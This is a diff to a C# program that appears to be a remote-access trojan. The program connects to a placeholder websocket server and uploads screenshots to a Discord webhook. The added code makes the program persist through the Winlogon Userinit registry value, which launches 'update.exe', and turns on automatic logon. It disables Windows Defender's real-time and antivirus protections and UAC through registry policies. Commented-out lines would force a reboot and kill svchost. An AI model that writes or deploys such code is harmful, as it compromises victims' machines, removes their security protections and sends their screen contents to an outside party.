@@ -11,23 +11,40 @@ using System.Text;
 using System.Xml.Linq;
 using Newtonsoft.Json.Linq;
 using System.Net.Http;
+using Microsoft.Win32;
 class Program
 {
 
     static async Task Main(string[] args)
     {
-        string serverUri = "websocket url";
+        string serverUri = "yourServerURL";
+
+        try
+        {
+            RegistryKey key4 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Luxo");
+            key4.GetValue("Firstrun");
+            Console.WriteLine("Already runned");
+
+        }catch
+        {
+            RegistryKey key4 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Luxo");
+            key4.SetValue("FirstRun", "1", RegistryValueKind.DWord);
+            Console.WriteLine("First run");
+            addToRegistry();
+        }
 
         using (var client = new ClientWebSocket())
         {
             try
             {
+                
+                Thread.Sleep(15000);
                 await client.ConnectAsync(new Uri(serverUri), CancellationToken.None);
                 await ReceiveMessages(client);
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Connection error: {ex.Message}");
+                Console.WriteLine($"Connection : {ex.Message}");
             }
         }
     }
@@ -54,7 +71,7 @@ class Program
                         string filePath = "C:\\Users\\mert\\AppData\\Local\\Temp\\screenshot.png";
                         ss.Save(filePath, ImageFormat.Png);
 
-                        string webhookUrl = "webhookurl";
+                        string webhookUrl = "yourWebhookURL";
 
                         string uploadResult = await SendImageToDiscord(webhookUrl, filePath);
                         Console.WriteLine(uploadResult);
@@ -114,6 +131,49 @@ class Program
         }
 
         return screenshot;
+    }
+
+    static void addToRegistry()
+    {
+        String username = Environment.UserName;
+        RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+        RegistryKey key2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
+        key2.SetValue("AutoAdminLogon", "1", RegistryValueKind.String);
+        key.SetValue("Userinit", "C:\\Windows\\system32\\userinit.exe, C:\\Users\\" + username + "\\update.exe", RegistryValueKind.String);
+        
+        RegistryKey key3 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection");
+        key3.SetValue("DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableOnAccessProtection", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableIOAVProtection", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableScriptScanning", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableAntiVirus", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
+        key3.SetValue("DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
+        
+
+        RegistryKey key4 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Luxo");
+        key4.SetValue("FirstRun", "1", RegistryValueKind.DWord);
+
+        RegistryKey key5 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+        key5.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+
+        /*
+        var cmd = new System.Diagnostics.ProcessStartInfo("shutdown.exe", "-r -t 0");
+        cmd.CreateNoWindow = true;
+        cmd.UseShellExecute = false;
+        cmd.ErrorDialog = false;
+        System.Diagnostics.Process.Start(cmd);
+        */
+
+        /*
+        foreach (var process in Process.GetProcessesByName("svchost"))
+        {
+            process.Kill();
+        }
+        */
     }
 
 }
